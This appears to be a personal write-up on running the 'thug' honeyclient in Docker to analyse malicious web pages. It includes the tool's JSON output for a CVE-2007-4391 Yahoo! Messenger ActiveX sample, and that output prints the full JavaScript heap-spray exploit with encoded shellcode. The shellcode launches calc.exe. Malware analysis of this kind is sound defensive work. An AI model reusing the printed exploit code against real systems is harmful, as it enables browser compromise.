# My Analysis of `thug`

## Setup

## Prerequisites

* Container Engine (e.g., Podman, Docker, etc)
  * ~~I'll be using `Podman` for this example, because `Docker` is old school and the f***ing Docker deamon drives me crazy. Even companies like RedHat are dropping support for the Docker Container Engine in RHEL 8 / CentOS 8~~ *I'll update to use Podman in the future*

Download Thug image

```
$ docker pull buffer/thug
```

# Download & unzip 

```
$ https://github.com/buffer/thug
```

# Start container

```
$ docker run -it -v /home/user/Downloads/thug-master/samples:/home/thug/samples -v /home/user/logs/thug:/tmp/thug/logs buffer/thug /bin/sh
```

# Run Sample Analysis on 10 files

```
$ for item in $(find samples/ -type f | xargs shuf -e |tail -n 10); do thug -Z -F -l $item; done
```

---

# Targeted Sample

## Invocation on file
```
$ thug -Z -F -l samples/exploits/4042.html
[2020-04-28 06:00:55] <object classid="clsid:DCE2F8B1-A520-11D4-8FD0-00D0B7730277" id="target"></object>
[2020-04-28 06:00:55] ActiveXObject: DCE2F8B1-A520-11D4-8FD0-00D0B7730277
[2020-04-28 06:00:55] [Yahoo! Messenger 8.x Ywcvwr ActiveX] Server Console Overflow
[2020-04-28 06:00:55] [EXPLOIT Classifier] URL: samples/exploits/4042.html (Rule: CVE-2007-4391, Classification: None)
[2020-04-28 06:00:55] [Shellcode Profile] UINT WINAPI WinExec (
     LPCSTR lpCmdLine = 0x4170a7 => 
           = "calc.exe";
     UINT uCmdShow = 0;
) =  0x20;
void ExitProcess (
     UINT uExitCode = 0;
) =  0x0;

[2020-04-28 06:00:55] Thug analysis logs saved at /tmp/thug/logs/2e467ae7778c29653dfb8bd14c3877f3/20200428060055
```
## Logs

```
$ docker cp 99122e48b388:/tmp/thug/logs/2e467ae7778c29653dfb8bd14c3877f3/20200428060055/analysis/json/analysis.json ~/.
```

```
$ cat ~/.analysis.json
{
    "url": "samples/exploits/4042.html",
    "timestamp": "2020-04-28 06:00:55.604233",
    "logtype": "json-log",
    "thug": {
        "version": "1.6",
        "personality": {
            "useragent": "winxpie60"
        },
        "plugins": {
            "acropdf": "9.1.0",
            "javaplugin": "1.6.0.32",
            "shockwaveflash": "10.0.64.0"
        },
        "options": {
            "local": false,
            "nofetch": false,
            "proxy": null,
            "events": [],
            "delay": 0,
            "referer": "about:blank",
            "timeout": 600,
            "threshold": 0,
            "extensive": false
        }
    },
    "behavior": [
        {
            "description": "[Yahoo! Messenger 8.x Ywcvwr ActiveX] Server Console Overflow",
            "cve": "CVE-2007-4391",
            "snippet": "",
            "method": "Dynamic Analysis",
            "timestamp": "2020-04-28 06:00:55.616168"
        },
        {
            "description": "[EXPLOIT Classifier] URL: samples/exploits/4042.html (Rule: CVE-2007-4391, Classification: None)",
            "cve": "",
            "snippet": "",
            "method": "Dynamic Analysis",
            "timestamp": "2020-04-28 06:00:55.616264"
        },
        {
            "description": "[Shellcode Profile] UINT WINAPI WinExec (     LPCSTR lpCmdLine = 0x4170a7 =>            = \"calc.exe\";     UINT uCmdShow = 0;) =  0x20;void ExitProcess (     UINT uExitCode = 0;) =  0x0;",
            "cve": "",
            "snippet": "927565b6ff3340b1a97f40ed90b68157",
            "method": "Static Analysis",
            "timestamp": "2020-04-28 06:00:55.632951"
        }
    ],
    "code": [
        {
            "snippet": "shellcode = unescape(\"%u9090%u9090%u9090%uC929%uE983%uD9DB%uD9EE%u2474\" +\"%u5BF4%u7381%uA913%u4A67%u83CC%uFCEB%uF4E2%u8F55\" +\"%uCC0C%u67A9%u89C1%uEC95%uC936%u66D1%u47A5%u7FE6\" +\"%u93C1%u6689%u2FA1%u2E87%uF8C1%u6622%uFDA4%uFE69\" +\"%u48E6%u1369%u0D4D%u6A63%u0E4B%u9342%u9871%u638D\" +\"%u2F3F%u3822%uCD6E%u0142%uC0C1%uECE2%uD015%u8CA8\" +\"%uD0C1%u6622%u45A1%u43F5%u0F4E%uA798%u472E%u57E9\" +\"%u0CCF%u68D1%u8CC1%uECA5%uD03A%uEC04%uC422%u6C40\" +\"%uCC4A%uECA9%uF80A%u1BAC%uCC4A%uECA9%uF022%u56F6\" +\"%uACBC%u8CFF%uA447%uBFD7%uBFA8%uFFC1%u46B4%u30A7\" + \"%u2BB5%u8941%u33B5%u0456%uA02B%u49CA%uB42F%u67CC\" +\"%uCC4A%uD0FF\");    bigblock = unescape(\"%u9090%u9090\"); headersize = 20; slackspace = headersize+shellcode.lengthwhile (bigblock.length<slackspace) bigblock+=bigblock; fillblock = bigblock.substring(0, slackspace); block = bigblock.substring(0, bigblock.length-slackspace); while(block.length+slackspace<0x40000) block = block+block+fillblock; memory = new Array(); for (x=0; x<800; x++) memory[x] = block + shellcode; var buffer = '\\x0a'; while (buffer.length < 5000) buffer+='\\x0a\\x0a\\x0a\\x0a'; target.server = buffer; target.initialize(); target.send();",
            "language": "Javascript",
            "relationship": "Contained_Inside",
            "tag": "d98bbdd3e6974f2587632918fe2c81cc",
            "method": "Dynamic Analysis"
        },
        {
            "snippet": "shellcode = unescape(\"%u9090%u9090%u9090%uC929%uE983%uD9DB%uD9EE%u2474\" +\"%u5BF4%u7381%uA913%u4A67%u83CC%uFCEB%uF4E2%u8F55\" +\"%uCC0C%u67A9%u89C1%uEC95%uC936%u66D1%u47A5%u7FE6\" +\"%u93C1%u6689%u2FA1%u2E87%uF8C1%u6622%uFDA4%uFE69\" +\"%u48E6%u1369%u0D4D%u6A63%u0E4B%u9342%u9871%u638D\" +\"%u2F3F%u3822%uCD6E%u0142%uC0C1%uECE2%uD015%u8CA8\" +\"%uD0C1%u6622%u45A1%u43F5%u0F4E%uA798%u472E%u57E9\" +\"%u0CCF%u68D1%u8CC1%uECA5%uD03A%uEC04%uC422%u6C40\" +\"%uCC4A%uECA9%uF80A%u1BAC%uCC4A%uECA9%uF022%u56F6\" +\"%uACBC%u8CFF%uA447%uBFD7%uBFA8%uFFC1%u46B4%u30A7\" + \"%u2BB5%u8941%u33B5%u0456%uA02B%u49CA%uB42F%u67CC\" +\"%uCC4A%uD0FF\");    bigblock = unescape(\"%u9090%u9090\"); headersize = 20; slackspace = headersize+shellcode.lengthwhile (bigblock.length<slackspace) bigblock+=bigblock; fillblock = bigblock.substring(0, slackspace); block = bigblock.substring(0, bigblock.length-slackspace); while(block.length+slackspace<0x40000) block = block+block+fillblock; memory = new Array(); for (x=0; x<800; x++) memory[x] = block + shellcode; var buffer = '\\x0a'; while (buffer.length < 5000) buffer+='\\x0a\\x0a\\x0a\\x0a'; target.server = buffer; target.initialize(); target.send();",
            "language": "Javascript",
            "relationship": "Contained_Inside",
            "tag": "72c8c6131f604788aa1bb73871d82feb",
            "method": "Dynamic Analysis"
        },
        {
            "snippet": "JXU5MDkwJXU5MDkwJXU5MDkwJXVDOTI5JXVFOTgzJXVEOURCJXVEOUVFJXUyNDc0JXU1QkY0JXU3MzgxJXVBOTEzJXU0QTY3JXU4M0NDJXVGQ0VCJXVGNEUyJXU4RjU1JXVDQzBDJXU2N0E5JXU4OUMxJXVFQzk1JXVDOTM2JXU2NkQxJXU0N0E1JXU3RkU2JXU5M0MxJXU2Njg5JXUyRkExJXUyRTg3JXVGOEMxJXU2NjIyJXVGREE0JXVGRTY5JXU0OEU2JXUxMzY5JXUwRDREJXU2QTYzJXUwRTRCJXU5MzQyJXU5ODcxJXU2MzhEJXUyRjNGJXUzODIyJXVDRDZFJXUwMTQyJXVDMEMxJXVFQ0UyJXVEMDE1JXU4Q0E4JXVEMEMxJXU2NjIyJXU0NUExJXU0M0Y1JXUwRjRFJXVBNzk4JXU0NzJFJXU1N0U5JXUwQ0NGJXU2OEQxJXU4Q0MxJXVFQ0E1JXVEMDNBJXVFQzA0JXVDNDIyJXU2QzQwJXVDQzRBJXVFQ0E5JXVGODBBJXUxQkFDJXVDQzRBJXVFQ0E5JXVGMDIyJXU1NkY2JXVBQ0JDJXU4Q0ZGJXVBNDQ3JXVCRkQ3JXVCRkE4JXVGRkMxJXU0NkI0JXUzMEE3JXUyQkI1JXU4OTQxJXUzM0I1JXUwNDU2JXVBMDJCJXU0OUNBJXVCNDJGJXU2N0NDJXVDQzRBJXVEMEZG",
            "language": "Assembly",
            "relationship": "Shellcode",
            "tag": "927565b6ff3340b1a97f40ed90b68157",
            "method": "Static Analysis"
        }
    ],
    "cookies": [],
    "files": [],
    "connections": [],
    "locations": [],
    "exploits": [
        {
            "url": "about:blank",
            "module": "Yahoo! Messenger 8.x Ywcvwr ActiveX",
            "description": "Server Console Overflow",
            "cve": "CVE-2007-4391",
            "data": null
        }
    ],
    "classifiers": [
        {
            "classifier": "exploit",
            "url": "samples/exploits/4042.html",
            "rule": "CVE-2007-4391",
            "meta": null,
            "tags": null
        }
    ],
    "images": [],
    "features": {}
}
```